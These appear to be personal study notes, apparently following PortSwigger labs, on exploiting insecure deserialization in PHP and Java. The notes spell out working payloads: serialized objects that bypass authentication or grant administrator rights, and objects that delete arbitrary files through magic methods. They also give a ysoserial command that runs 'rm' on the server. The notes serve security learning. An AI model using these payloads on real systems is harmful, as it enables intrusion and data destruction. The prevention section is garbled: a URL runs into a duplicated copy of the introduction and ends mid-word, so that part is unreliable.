# Insecure deserialization

serialization pickle.dumps(), deserialization pickle.loads(). Example: Python Pickle. Can cause Object Injection, DoS, RCE...

**Serialization** is the process of converting complex data structures, such as objects, into a sequential stream of bytes. Serializing data makes it much simpler to:

* Write complex data to inter-process memory, a file, or a database
* Send complex data, for example, over a network, between different components of an application, or in an API call

**Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object.

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

To prevent a field from being serialized, it must be explicitly marked as "transient" in the class declaration.

Be aware that when working with different programming languages, serialization may be referred to as marshalling (Ruby) or pickling (Python).

Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.

Insecure deserialization typically arises because there is a general lack of understanding of how dangerous deserializing user-controllable data can be. Ideally, user input should never be deserialized at all.

Deserialization-based attacks are also made possible due to the number of dependencies that exist in modern websites.

Even in cases where remote code execution is not possible, insecure deserialization can lead to privilege escalation, arbitrary file access, and denial-of-service attacks.

## Exploiting insecure deserialization vulnerabilities

{% code overflow="wrap" fullWidth="true" %}
```sh
############# HOW TO IDENTIFY
### PHP serialization format
# Object
$user->name = "carlos";
$user->isLoggedIn = true;
# Serialized
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
#This can be interpreted as follows:
    O:4:"User" - An object with the 4-character class name "User"
    2 - the object has 2 attributes
    s:4:"name" - The key of the first attribute is the 4-character string "name"
    s:6:"carlos" - The value of the first attribute is the 6-character string "carlos"
    s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn"
    b:1 - The value of the second attribute is the boolean value true
Methods: serialize() and unserialize(). If you have source code access, look for unserialize() anywhere in the code and investigating further. 
### Java serialization format
Serialized Java objects always begin with the same bytes, which are encoded as ac ed in hexadecimal and rO0 in Base64. 
Any class that implements the interface java.io.Serializable can be serialized and deserialized. 
If source code access, look for readObject() method, which is used to read and deserialize data from an InputStream. 

############ MANIPULATING SERIALIZED OBJECTS
### Modifying object attributes
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
isAdmin attribute is interesting. We could change the boolean value to 1 (true), re-encode the object, and overwrite their current cookie with this modified value. 
# let's say the website uses this cookie to check whether the current user has access to certain administrative functionality: 
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
// allow access to admin interface
}
Check session cookie, decode it, change value, re-encode and overwrite cookie
### Modifying data types
# PHP-based logic is particularly vulnerable due to loose comparison ==
5 == "5 of something" is in practice treated as 5 == 5 /// comparison int == str, PHP will attempt int(str)
# on PHP <= 7.x the comparison 0 == "Example string" evaluates to true, because PHP treats entire string as integer 0
# Case where == comparison operator is used in conjunction with user-controllable data from a deserialized object. 
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
# We edit password to int 0. As long as stored password does not start with a number, the condition is always true
# NOTE: this is only possible because deserialization preserves the data type. 
# If the code fetched the password from the request directly, the 0 would be converted to a string and condition -> false
# NOTE 2: when modifying data types in any serialized object format, update type and lenght indicators on serialized data
# Example of the vuln with loose comparison on access_token attribute
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"a0p66wcocj1bhcq4pdd9niov5bginrza";}
# Exploitation to become administrator
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

############# USING APPLICATION FUNCTIONALITY
# Example: "Delete user" feature, user profile picture is also deleted due to $user->image_location attribute. 
# If this $user was created from a serialized object, an attacker could change image_location and delete arbitrary files. 
POST request to /my-account/delete
Notice that the serialized object has an avatar_link attribute, which contains the file path to your avatar
Edit the serialized data so that the avatar_link points to /home/carlos/morale.txt
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"

############# MAGIC METHODS
Magic methods are a special subset of methods invoked automatically whenever a particular event or scenario occurs.
# PHP example: __construct(), invoked whenever an object of the class is instantiated, similar to Python's __init__
# PHP example 2: unserialize() method looks for and invokes an object's __wakeup() magic method. 
# Java example: ObjectInputStream.readObject() method, which is used to read data from the initial byte stream
# However, Serializable classes can also declare their own readObject() method as follows:
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    // implementation
}

############### INJECTING ARBITRARY OBJECTS
If we have access to source code, we can look for classes containing deserialization magic methods, then check
whether any of them perform dangerous operations on controllable data. The attacker can then pass in
 a serialized object of this class to use its magic method for an exploit. 
# Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file
# Example: source code has CustomTemplate class which contains the __destruct() magic method. 
function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
# __destruct() is invoked autom. when CustomTemplate object is deserialized; if file exists, unlink() function deletes it
In Burp Decoder, use the correct syntax for serialized PHP data to create a CustomTemplate object with the lock_file_path 
attribute set to /home/carlos/morale.txt. Make sure to use the correct data type labels and length indicators.
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

############### GADGET CHAINS
A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal.
By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous
 "sink gadget", where it can cause maximum damage. 
### Working with pre-built gadget chains
# ysoserial
One such tool for Java deserialization is "ysoserial". You choose gadget chains from a library you think the app is using,
then pass in a command that you want to execute. It then creates a serialized object based on the selected chain.
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   [payload] '[command]'
Gadget chains to help you quickly detect insecure deserialization on virtually any server: 
- The URLDNS chain triggers a DNS lookup for a supplied URL. You can use it with Burp Collaborator.
- JRMPClient causes the server to try establishing a TCP connection to the supplied IP address. 
# To exploit vuln web using a serialization-based session mechanism and loads the Apache Commons Collections library
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   CommonsCollections4 'rm /home/carlos/morale.txt' | base64
### PHP Generic Gadget Chains
https://github.com/ambionics/phpggc
```
{% endcode %}

## How to prevent insecure deserialization vulnerabilities

You could implement a digital signature to check the integrity of the data. However, remember that any checks must take place before beginning the deserialization process.\
If possible, you should avoid using generic deserialization features altogether.\
https://portswigger.net/web-security/dTo prevent a field from being serialized, it must be explicitly marked as "transient" in the class declaration.\
Be aware that when working with different programming languages, serialization may be referred to as marshalling (Ruby) or pickling (Python).\
Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.\
Insecure deserialization typically arises because there is a general lack of understanding of how dangerous deserializing user-controllable data can be. Ideally, user input should never be deserialized at all.\
Deserialization-based attacks are also made possible due to the number of dependencies that exist in modern websites.\
Even in cases where remote code execution is not possible, insecure deserialization can lead to privilege escalation, arbitrary file access, and denial-of-service attacks. eserialization
